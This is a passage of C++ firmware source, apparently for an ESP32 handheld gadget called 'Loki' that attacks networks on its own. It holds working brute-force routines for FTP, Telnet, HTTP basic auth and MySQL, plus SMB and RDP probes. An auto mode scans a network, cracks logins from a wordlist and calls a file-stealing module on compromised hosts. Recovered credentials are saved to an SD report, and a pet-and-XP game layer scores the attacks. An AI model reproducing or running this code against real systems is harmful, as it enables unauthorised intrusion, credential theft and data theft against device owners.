    for (int c = 0; c < totalCredCount && running && !cracked; c++) {
        const char* user; const char* pw;
        getCred(c, user, pw);

        if (c > 0 && c % 10 == 0) {
            char msg[52]; snprintf(msg, sizeof(msg), "[>] %s FTP [%d/%d]", ipStr, c, totalCredCount);
            LokiPet::addKillLine(msg, KF_DIM);
        }

        if (client.connect(devIP, 21, 2000)) {
            connFails = 0;
            // Wait for 220 banner
            t0 = millis(); String resp = "";
            while (client.connected() && millis() - t0 < 3000 && resp.length() < 256) {
                while (client.available()) resp += (char)client.read();
                if (resp.indexOf("\n") >= 0) break;
                vTaskDelay(pdMS_TO_TICKS(50));
            }

            // USER
            client.printf("USER %s\r\n", user);
            resp = ""; t0 = millis();
            while (client.connected() && millis() - t0 < 2000 && resp.length() < 256) {
                while (client.available()) resp += (char)client.read();
                if (resp.indexOf("\n") >= 0) break;
                vTaskDelay(pdMS_TO_TICKS(50));
            }

            if (resp.startsWith("230")) {
                // Anonymous login
                cracked = true;
                strncpy(dev.credUser, user, LOKI_MAX_CRED_USER - 1);
                strncpy(dev.credPass, "(anon)", LOKI_MAX_CRED_PASS - 1);
                dev.status = STATUS_CRACKED; servicesCracked++;
                dev.crackedPorts |= PORT_FTP;
                LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 21, user, "(anon)");
                LokiPet::setMood(MOOD_CRACKED);
                char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s FTP %s (anon)", ipStr, user);
                LokiPet::addKillLine(msg, KF_CRACKED);
            } else if (resp.startsWith("331")) {
                // Need password
                client.printf("PASS %s\r\n", pw);
                resp = ""; t0 = millis();
                while (client.connected() && millis() - t0 < 2000 && resp.length() < 256) {
                    while (client.available()) resp += (char)client.read();
                    if (resp.indexOf("\n") >= 0) break;
                    vTaskDelay(pdMS_TO_TICKS(50));
                }

                if (resp.startsWith("230")) {
                    cracked = true;
                    strncpy(dev.credUser, user, LOKI_MAX_CRED_USER - 1);
                    strncpy(dev.credPass, pw, LOKI_MAX_CRED_PASS - 1);
                    dev.status = STATUS_CRACKED; servicesCracked++;
                    dev.crackedPorts |= PORT_FTP;
                    LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 21, user, pw);
                    LokiPet::setMood(MOOD_CRACKED);
                    char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s FTP %s:%s", ipStr, user, pw);
                    LokiPet::addKillLine(msg, KF_CRACKED);
                }
            }
            client.print("QUIT\r\n"); delay(100);
            client.stop();
        } else if (++connFails >= 5) {
            LokiPet::addKillLine(("[!] " + String(ipStr) + " FTP blocked").c_str(), KF_DIM);
            break;
        }
        vTaskDelay(1);
    }

    if (!cracked && dev.status == STATUS_TESTING) {
        if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
        char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s FTP", ipStr);
        LokiPet::addKillLine(msg, KF_DIM);
    }

    return cracked;
}

// ── attackTelnet: Telnet brute force ──
bool attackTelnet(int deviceIdx) {
    if (deviceIdx < 0 || deviceIdx >= deviceCount) return false;
    LokiDevice& dev = devices[deviceIdx];
    if (!(dev.openPorts & PORT_TELNET)) return false;

    IPAddress devIP(dev.ip[0], dev.ip[1], dev.ip[2], dev.ip[3]);
    char ipStr[16];
    ipToStr(dev.ip, ipStr, sizeof(ipStr));
    unsigned long t0;

    LokiPet::setStatus("TelnetBruteforce", ipStr);
    dev.status = STATUS_TESTING;
    bool cracked = false;
    int connFails = 0;

    LokiPet::addKillLine(("[>] Telnet brute " + String(ipStr)).c_str(), KF_INFO);

    for (int c = 0; c < totalCredCount && running && !cracked; c++) {
        const char* user; const char* pw;
        getCred(c, user, pw);

        if (c > 0 && c % 10 == 0) {
            char msg[52]; snprintf(msg, sizeof(msg), "[>] %s Telnet [%d/%d]", ipStr, c, totalCredCount);
            LokiPet::addKillLine(msg, KF_DIM);
        }

        if (client.connect(devIP, 23, 1000)) {
            connFails = 0;
            // Wait for login prompt
            t0 = millis(); String resp = "";
            while (client.connected() && millis() - t0 < 3000 && resp.length() < 256) {
                while (client.available()) resp += (char)client.read();
                String rLow = resp; rLow.toLowerCase();
                if (rLow.indexOf("login") >= 0 || rLow.indexOf("user") >= 0 || rLow.indexOf(":") >= 0) break;
                vTaskDelay(pdMS_TO_TICKS(50));
            }

            client.printf("%s\r\n", user); delay(500);

            // Wait for password prompt
            resp = ""; t0 = millis();
            while (client.connected() && millis() - t0 < 2000 && resp.length() < 256) {
                while (client.available()) resp += (char)client.read();
                String rLow = resp; rLow.toLowerCase();
                if (rLow.indexOf("pass") >= 0 || rLow.indexOf(":") >= 0) break;
                vTaskDelay(pdMS_TO_TICKS(50));
            }

            client.printf("%s\r\n", pw); delay(1000);

            // Check for shell
            resp = ""; t0 = millis();
            while (client.connected() && millis() - t0 < 2000 && resp.length() < 256) {
                while (client.available()) resp += (char)client.read();
                vTaskDelay(pdMS_TO_TICKS(50));
            }
            client.stop();

            String rLow = resp; rLow.toLowerCase();
            if ((rLow.indexOf("$") >= 0 || rLow.indexOf("#") >= 0 || rLow.indexOf(">") >= 0 ||
                 rLow.indexOf("welcome") >= 0 || rLow.indexOf("busybox") >= 0) &&
                rLow.indexOf("incorrect") < 0 && rLow.indexOf("denied") < 0 &&
                rLow.indexOf("failed") < 0 && rLow.indexOf("invalid") < 0) {
                cracked = true;
                strncpy(dev.credUser, user, LOKI_MAX_CRED_USER - 1);
                strncpy(dev.credPass, pw, LOKI_MAX_CRED_PASS - 1);
                dev.status = STATUS_CRACKED; servicesCracked++;
                dev.crackedPorts |= PORT_TELNET;
                LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 23, user, pw);
                LokiPet::setMood(MOOD_CRACKED);
                char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s telnet %s:%s", ipStr, user, pw);
                LokiPet::addKillLine(msg, KF_CRACKED);
            }
        } else if (++connFails >= 5) {
            LokiPet::addKillLine(("[!] " + String(ipStr) + " Telnet blocked").c_str(), KF_DIM);
            break;
        }
        vTaskDelay(1);
    }

    if (!cracked && dev.status == STATUS_TESTING) {
        if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
        char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s telnet", ipStr);
        LokiPet::addKillLine(msg, KF_DIM);
    }

    return cracked;
}

// ── attackHTTP: HTTP basic auth brute force ──
bool attackHTTP(int deviceIdx) {
    if (deviceIdx < 0 || deviceIdx >= deviceCount) return false;
    LokiDevice& dev = devices[deviceIdx];
    if (!(dev.openPorts & (PORT_HTTP | PORT_HTTP2))) return false;

    IPAddress devIP(dev.ip[0], dev.ip[1], dev.ip[2], dev.ip[3]);
    char ipStr[16];
    ipToStr(dev.ip, ipStr, sizeof(ipStr));
    unsigned long t0;

    uint16_t port = (dev.openPorts & PORT_HTTP) ? 80 : 8080;

    LokiPet::setStatus("HTTPBruteforce", ipStr);
    dev.status = STATUS_TESTING;
    bool cracked = false;
    int connFails = 0;

    LokiPet::addKillLine(("[>] HTTP brute " + String(ipStr)).c_str(), KF_INFO);

    for (int c = 0; c < totalCredCount && running && !cracked; c++) {
        const char* user; const char* pw;
        getCred(c, user, pw);

        if (c > 0 && c % 10 == 0) {
            char msg[52]; snprintf(msg, sizeof(msg), "[>] %s HTTP [%d/%d]", ipStr, c, totalCredCount);
            LokiPet::addKillLine(msg, KF_DIM);
        }

        if (client.connect(devIP, port, 1000)) {
            connFails = 0;
            char authPlain[40]; snprintf(authPlain, sizeof(authPlain), "%s:%s", user, pw);
            char authB64[64]; base64Encode(authPlain, strlen(authPlain), authB64, sizeof(authB64));

            client.printf("GET / HTTP/1.0\r\nHost: %s\r\nAuthorization: Basic %s\r\nConnection: close\r\n\r\n", ipStr, authB64);

            t0 = millis(); String resp = "";
            while (client.connected() && millis() - t0 < 2000 && resp.length() < 128) {
                while (client.available() && resp.length() < 128) resp += (char)client.read();
                vTaskDelay(1);
            }
            client.stop();

            if (resp.indexOf("200") >= 0 && resp.indexOf("401") < 0) {
                cracked = true;
                strncpy(dev.credUser, user, LOKI_MAX_CRED_USER - 1);
                strncpy(dev.credPass, pw, LOKI_MAX_CRED_PASS - 1);
                dev.status = STATUS_CRACKED; servicesCracked++;
                dev.crackedPorts |= (dev.openPorts & PORT_HTTP) ? PORT_HTTP : PORT_HTTP2;
                LokiScoreManager::addServiceCracked(); addCredential(dev.ip, port, user, pw);
                LokiPet::setMood(MOOD_CRACKED);
                char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s HTTP %s:%s", ipStr, user, pw);
                LokiPet::addKillLine(msg, KF_CRACKED);
            }
        } else if (++connFails >= 5) {
            LokiPet::addKillLine(("[!] " + String(ipStr) + " HTTP blocked").c_str(), KF_DIM);
            break;
        }
        vTaskDelay(1);
    }

    if (!cracked && dev.status == STATUS_TESTING) {
        if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
        char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s HTTP", ipStr);
        LokiPet::addKillLine(msg, KF_DIM);
    }

    return cracked;
}

// ── attackMySQL: MySQL brute force (empty password detection) ──
bool attackMySQL(int deviceIdx) {
    if (deviceIdx < 0 || deviceIdx >= deviceCount) return false;
    LokiDevice& dev = devices[deviceIdx];
    if (!(dev.openPorts & PORT_MYSQL)) return false;

    IPAddress devIP(dev.ip[0], dev.ip[1], dev.ip[2], dev.ip[3]);
    char ipStr[16];
    ipToStr(dev.ip, ipStr, sizeof(ipStr));
    unsigned long t0;

    LokiPet::setStatus("MySQLBruteforce", ipStr);
    dev.status = STATUS_TESTING;
    bool cracked = false;
    int connFails = 0;

    LokiPet::addKillLine(("[>] MySQL brute " + String(ipStr)).c_str(), KF_INFO);

    for (int c = 0; c < totalCredCount && running && !cracked; c++) {
        const char* user; const char* pw;
        getCred(c, user, pw);

        if (c > 0 && c % 20 == 0) {
            char msg[52]; snprintf(msg, sizeof(msg), "[>] %s MySQL [%d/%d]", ipStr, c, totalCredCount);
            LokiPet::addKillLine(msg, KF_DIM);
        }

        if (client.connect(devIP, 3306, 2000)) {
            connFails = 0;
            // Read MySQL greeting
            t0 = millis();
            uint8_t greeting[128];
            int gLen = 0;
            while (client.connected() && millis() - t0 < 3000 && gLen < 128) {
                while (client.available() && gLen < 128) greeting[gLen++] = client.read();
                if (gLen > 4) break;
                vTaskDelay(1);
            }

            if (gLen > 36) {
                // Extract salt from greeting for auth
                // MySQL native auth: SHA1(password) XOR SHA1(salt + SHA1(SHA1(password)))
                // This is complex — for now detect if no-password access works

                // Build auth packet with empty password
                uint8_t authPkt[64];
                int pLen = 0;
                // Packet header (length + seq)
                authPkt[3] = 1; // Sequence number
                // Client capabilities
                authPkt[4] = 0x0D; authPkt[5] = 0xA6;
                authPkt[6] = 0x03; authPkt[7] = 0x00;
                // Max packet size
                authPkt[8] = 0x00; authPkt[9] = 0x00;
                authPkt[10] = 0x00; authPkt[11] = 0x01;
                // Charset (UTF8)
                authPkt[12] = 0x21;
                // Reserved (23 bytes of 0)
                memset(&authPkt[13], 0, 23);
                pLen = 36;
                // Username
                int uLen = strlen(user);
                memcpy(&authPkt[pLen], user, uLen);
                pLen += uLen;
                authPkt[pLen++] = 0; // null terminator
                // Password length (0 = empty)
                authPkt[pLen++] = 0;
                // Set packet length
                int bodyLen = pLen - 4;
                authPkt[0] = bodyLen & 0xFF;
                authPkt[1] = (bodyLen >> 8) & 0xFF;
                authPkt[2] = (bodyLen >> 16) & 0xFF;

                client.write(authPkt, pLen);

                // Read response
                t0 = millis();
                uint8_t resp[64];
                int rLen = 0;
                while (client.connected() && millis() - t0 < 2000 && rLen < 64) {
                    while (client.available() && rLen < 64) resp[rLen++] = client.read();
                    if (rLen > 4) break;
                    vTaskDelay(1);
                }

                // Check OK packet (0x00) or Error (0xFF)
                if (rLen > 4 && resp[4] == 0x00) {
                    cracked = true;
                    strncpy(dev.credUser, user, LOKI_MAX_CRED_USER - 1);
                    strncpy(dev.credPass, "(empty)", LOKI_MAX_CRED_PASS - 1);
                    dev.status = STATUS_CRACKED; servicesCracked++;
                    dev.crackedPorts |= PORT_MYSQL;
                    LokiScoreManager::addServiceCracked(); addCredential(dev.ip, 3306, user, "(empty)");
                    LokiPet::setMood(MOOD_CRACKED);
                    char msg[52]; snprintf(msg, sizeof(msg), "[!!!] CRACKED %s MySQL %s", ipStr, user);
                    LokiPet::addKillLine(msg, KF_CRACKED);
                }
            }
            client.stop();
        } else if (++connFails >= 5) break;
        vTaskDelay(1);
    }

    if (!cracked && dev.status == STATUS_TESTING) {
        if (dev.status != STATUS_CRACKED) dev.status = STATUS_LOCKED;
        char msg[52]; snprintf(msg, sizeof(msg), "[x] LOCKED %s MySQL", ipStr);
        LokiPet::addKillLine(msg, KF_DIM);
    }

    return cracked;
}

// ── attackSMB: SMB detection/brute (port 445) ──
bool attackSMB(int deviceIdx) {
    if (deviceIdx < 0 || deviceIdx >= deviceCount) return false;
    LokiDevice& dev = devices[deviceIdx];
    if (!(dev.openPorts & PORT_SMB)) return false;

    IPAddress devIP(dev.ip[0], dev.ip[1], dev.ip[2], dev.ip[3]);
    char ipStr[16];
    ipToStr(dev.ip, ipStr, sizeof(ipStr));
    unsigned long t0;

    LokiPet::setStatus("SMBBruteforce", ipStr);
    dev.status = STATUS_TESTING;
    bool cracked = false;
    int connFails = 0;

    LokiPet::addKillLine(("[>] SMB brute " + String(ipStr)).c_str(), KF_INFO);

    for (int c = 0; c < totalCredCount && running && !cracked; c++) {
        const char* user; const char* pw;
        getCred(c, user, pw);

        if (c > 0 && c % 20 == 0) {
            char msg[52]; snprintf(msg, sizeof(msg), "[>] %s SMB [%d/%d]", ipStr, c, totalCredCount);
            LokiPet::addKillLine(msg, KF_DIM);
        }

        // SMB uses the same SSH library via NTLM — too complex for raw TCP
        // Use a TCP connect + SMB negotiate to detect if auth is needed
        if (client.connect(devIP, 445, 1000)) {
            connFails = 0;
            // Send SMB negotiate protocol request
            uint8_t smbNeg[] = {
                0x00, 0x00, 0x00, 0x85, // NetBIOS session
                0xFF, 0x53, 0x4D, 0x42, // SMB magic
                0x72,                     // Negotiate
                0x00, 0x00, 0x00, 0x00,  // Status
                0x18, 0x53, 0xC8,        // Flags
                0x00, 0x00,              // Flags2
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Pad
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Pad
                0x00, 0x00, 0x00, 0x00,  // TreeID/ProcID
            };
            client.write(smbNeg, sizeof(smbNeg));

            t0 = millis();
            bool gotResp = false;
            while (client.connected() && millis() - t0 < 2000) {
                if (client.available() >= 4) { gotResp = true; break; }
                vTaskDelay(1);
            }
            client.stop();

            // SMB negotiation response indicates service is alive
            // Real SMB auth needs a full NTLM exchange — mark as detected for now
            if (gotResp && c == 0) {
                // Check if guest/anonymous access works
                // TODO: Implement full NTLM auth sequence
                char msg[52]; snprintf(msg, sizeof(msg), "[*] SMB %s responds", ipStr);
                LokiPet::addKillLine(msg, KF_INFO);
            }
        } else if (++connFails >= 5) break;
        vTaskDelay(1);

        // Break after first attempt — full SMB brute needs NTLM implementation
        break;
    }

    if (!cracked && dev.status == STATUS_TESTING) {
        dev.status = STATUS_FOUND;  // Not locked, just can't brute yet
    }

    return cracked;
}

// ── attackRDP: RDP detection (port 3389) ──
bool attackRDP(int deviceIdx) {
    if (deviceIdx < 0 || deviceIdx >= deviceCount) return false;
    LokiDevice& dev = devices[deviceIdx];
    if (!(dev.openPorts & PORT_RDP)) return false;
    if (dev.status == STATUS_CRACKED) return false;

    char ipStr[16];
    ipToStr(dev.ip, ipStr, sizeof(ipStr));

    // RDP brute force requires CredSSP/NLA which needs TLS — too complex for raw TCP
    // Log as detected service
    char msg[52]; snprintf(msg, sizeof(msg), "[*] RDP %s detected", ipStr);
    LokiPet::addKillLine(msg, KF_INFO);

    return false;
}

// ── attackAllPorts: run all relevant attacks on a device's open ports ──
void attackAllPorts(int deviceIdx) {
    if (deviceIdx < 0 || deviceIdx >= deviceCount) return;
    LokiDevice& dev = devices[deviceIdx];

    // Skip if already done
    if (dev.attackPhase >= 4) return;

    dev.attackPhase = 3;  // attacking

    // Port attack order matches original scanTask sequence:
    // Telnet, FTP, SSH, SMB, MySQL, RDP, HTTP
    // Use attackPortIdx to track resume position
    struct { uint16_t mask; bool (*fn)(int); } attacks[] = {
        { PORT_TELNET, attackTelnet },
        { PORT_FTP,    attackFTP    },
        { PORT_SSH,    attackSSH    },
        { PORT_SMB,    attackSMB    },
        { PORT_MYSQL,  attackMySQL  },
        { PORT_RDP,    attackRDP    },
        { PORT_HTTP | PORT_HTTP2, attackHTTP },
    };
    const int ATTACK_COUNT = 7;

    for (int i = dev.attackPortIdx; i < ATTACK_COUNT && running; i++) {
        if (dev.openPorts & attacks[i].mask) {
            // Skip if this port was already cracked
            if (!(dev.crackedPorts & attacks[i].mask)) {
                attacks[i].fn(deviceIdx);
                totalAttacks++;
                LokiScoreManager::addAttackCompleted();
            }
        }
        dev.attackPortIdx = i + 1;
        if (!running) return;
    }

    dev.attackPhase = 4;  // done
}

// =============================================================================
// FILE STEAL — wrapper for steal module
// =============================================================================

int stealFiles(int deviceIdx) {
    if (deviceIdx < 0 || deviceIdx >= deviceCount) return 0;
    int stolen = LokiSteal::stealFromDevice(devices[deviceIdx]);
    filesStolen += stolen;
    return stolen;
}

// =============================================================================
// AUTO MODE — Full autonomous pipeline
// =============================================================================

void runAutoMode() {
    Serial.println("[RECON] Core 0: Auto mode started");

    // Cache kill feed colors from theme
    cacheKillFeedColors();
    client.setTimeout(3);

    // Wordlist already loaded by start() on Core 1 (avoids SD bus conflict)
    {
        char msg[52];
        snprintf(msg, sizeof(msg), "[*] %d credentials armed", totalCredCount);
        LokiPet::addKillLine(msg, KF_INFO);
    }

    // ── STEP 1: Connect WiFi ──
    if (!connectWiFi()) return;
    if (!running) return;

    // ── STEP 2: Discover hosts + port scan ──
    // >>> TEST MODE: single host 10.0.0.4 <<<
    {
        deviceCount = 0;
        LokiDevice& dev = devices[deviceCount++];
        memset(&dev, 0, sizeof(LokiDevice));
        dev.ip[0] = 10; dev.ip[1] = 0; dev.ip[2] = 0; dev.ip[3] = 4;
        dev.status = STATUS_FOUND;
        hostsFound = 1;
        LokiScoreManager::addHostFound();
        LokiPet::addKillLine("[*] TEST: targeting 10.0.0.4", KF_INFO);
        scanHostPorts(0);
    }
    int found = deviceCount;
    // >>> END TEST MODE <<<
    if (!running) return;
    if (found == 0) {
        LokiPet::addKillLine("[!] No hosts found", KF_ERROR);
        LokiPet::setMood(MOOD_BORED);
        return;
    }

    // ── STEP 3: Identify services ──
    scanPhase = PHASE_IDENTIFY;
    {
        char detail[40];
        snprintf(detail, sizeof(detail), "%d open ports found", (int)portsFound);
        LokiPet::setStatus("NetworkScanner", detail);
    }
    LokiPet::addKillLine("[>] Service identification", KF_INFO);

    for (int d = 0; d < deviceCount && running; d++) {
        char identDetail[40];
        snprintf(identDetail, sizeof(identDetail), "Identifying services %d/%d", d + 1, deviceCount);
        LokiPet::setStatus("NetworkScanner", identDetail);
        identifyServices(d);
        vTaskDelay(1);
    }
    if (!running) return;

    // ── STEP 4: Attack all devices ──
    scanPhase = PHASE_ATTACK;
    {
        char detail[40];
        snprintf(detail, sizeof(detail), "Services identified on %d hosts", deviceCount);
        LokiPet::setStatus("NetworkScanner", detail);
    }
    LokiPet::setMood(MOOD_ATTACKING);
    LokiPet::addKillLine("[>] Brute force started", KF_ATTACK);

    for (int d = 0; d < deviceCount && running; d++) {
        // Skip devices already fully attacked
        if (devices[d].attackPhase >= 4) continue;
        attackAllPorts(d);
        vTaskDelay(1);
    }
    if (!running) return;

    Serial.println("[RECON] Brute force phase complete");

    // ── STEP 4.5: File steal on cracked hosts (requires SD card) ──
    Serial.printf("[RECON] SD=%d cracked=%d\n", LokiSprites::sdAvailable(), (int)servicesCracked);
    if (LokiSprites::sdAvailable() && servicesCracked > 0) {
        LokiPet::addKillLine("[>] File steal started", KF_ATTACK);
        LokiPet::setMood(MOOD_STEALING);

        for (int d = 0; d < deviceCount && running; d++) {
            if (devices[d].status == STATUS_CRACKED) {
                Serial.printf("[RECON] Stealing from device %d, crackedPorts=0x%02X\n", d, devices[d].crackedPorts);
                stealFiles(d);
                LokiScoreManager::save();
            }
            vTaskDelay(1);
        }
        Serial.println("[RECON] File steal phase complete");
    }
    if (!running) return;

    // ── STEP 5: Done ──
    scanPhase = PHASE_DONE;
    LokiScoreManager::save();

    {
        char msg[52];
        snprintf(msg, sizeof(msg), "=== DONE: %d hosts, %d cracked ===", (int)hostsFound, (int)servicesCracked);
        LokiPet::addKillLine(msg, KF_XP);
        LokiPet::setStatus("IDLE");
        LokiPet::setMood(servicesCracked > 0 ? MOOD_HAPPY : MOOD_BORED);
    }

    // Save report to SD
    if (LokiSprites::sdMount()) {
        File f = SD.open("/loki/report.txt", FILE_WRITE);
        if (f) {
            f.println("=== Loki CYD Recon Report ===");
            f.printf("Network: %d.%d.%d.%d/24\n", gatewayIP[0], gatewayIP[1], gatewayIP[2], 0);
            f.printf("Hosts: %d  Cracked: %d\n\n", (int)hostsFound, (int)servicesCracked);

            for (int d = 0; d < deviceCount; d++) {
                LokiDevice& dev = devices[d];
                char ip[16]; ipToStr(dev.ip, ip, sizeof(ip));
                f.printf("[%s] %s (%s)\n",
                    dev.status == STATUS_CRACKED ? "CRACKED" :
                    dev.status == STATUS_OPEN ? "OPEN" :
                    dev.status == STATUS_LOCKED ? "LOCKED" : "FOUND",
                    ip, dev.banner);
                if (dev.status == STATUS_CRACKED) {
                    f.printf("  Creds: %s:%s\n", dev.credUser, dev.credPass);
                }
                f.print("  Ports:");
                for (int p = 0; p < LOKI_MAX_PORTS; p++) {
                    if (dev.openPorts & (1 << p)) f.printf(" %d(%s)", scanPorts[p], portNames[p]);
                }
                f.println("\n");
            }
            f.close();
            LokiPet::addKillLine("[*] Report saved to SD", KF_SUCCESS);
        }
        LokiSprites::sdUnmount();
    }
}

// =============================================================================
// CORE 0 TASK WRAPPER
// =============================================================================

static void autoModeTask(void* param) {
    runAutoMode();
    running = false;
    done = true;
    scanTaskHandle = NULL;
    vTaskDelete(NULL);
}

// =============================================================================
// PUBLIC API
// =============================================================================

void setup() {
    deviceCount = 0;
    scanPhase = PHASE_IDLE;
    running = false; done = false;
    hostsFound = portsFound = servicesCracked = filesStolen = vulnsFound = totalAttacks = 0;
}

void start() {
    if (scanTaskHandle) return;
    setup();
    // Load SD wordlist on Core 1 BEFORE starting Core 0 task
    // to avoid SD bus conflicts with pet animation sprite reads
    loadSdWordlist();
    running = true; done = false;
    xTaskCreatePinnedToCore(autoModeTask, "LokiRecon", 32768, NULL, 1, &scanTaskHandle, 0);
}

void stop() {
    running = false;
    if (scanTaskHandle) {
        unsigned long t0 = millis();
        while (!done && millis() - t0 < 2000) vTaskDelay(pdMS_TO_TICKS(10));
        scanTaskHandle = NULL;
    }
}

bool isRunning() { return running; }
bool isDone() { return done; }
LokiScanPhase getPhase() { return scanPhase; }
LokiDevice* getDevices() { return devices; }
int getDeviceCount() { return deviceCount; }
LokiCredEntry* getCredLog() { return credLog; }
int getCredLogCount() { return credLogCount; }

void clearDevices() {
    deviceCount = 0;
    hostsFound = 0;
    portsFound = 0;
    memset(devices, 0, sizeof(devices));
    Serial.println("[RECON] Devices cleared");
}

void clearCredLog() {
    credLogCount = 0;
    servicesCracked = 0;
    memset(credLog, 0, sizeof(credLog));
    Serial.println("[RECON] Credentials cleared");
}

LokiScore getStats() {
    LokiScore s;
    s.hostsFound = hostsFound; s.portsFound = portsFound;
    s.servicesCracked = servicesCracked; s.filesStolen = filesStolen;
    s.vulnsFound = vulnsFound;
    s.totalAttacks = totalAttacks;
    s.xp = LokiScoreManager::get().xp;
    return s;
}

void setWiFi(const char* newSSID, const char* newPass) {
    strncpy(ssid, newSSID, sizeof(ssid) - 1);
    strncpy(pass, newPass, sizeof(pass) - 1);
}

void restoreCredential(uint8_t* ip, uint16_t port, const char* user, const char* pass) {
    if (credLogCount < LOKI_MAX_CREDS) {
        memcpy(credLog[credLogCount].ip, ip, 4);
        credLog[credLogCount].port = port;
        strncpy(credLog[credLogCount].user, user, LOKI_MAX_CRED_USER - 1);
        strncpy(credLog[credLogCount].pass, pass, LOKI_MAX_CRED_PASS - 1);
        credLogCount++;
    }
}

void cleanup() { stop(); WiFi.disconnect(); WiFi.mode(WIFI_OFF); }

}  // namespace LokiRecon
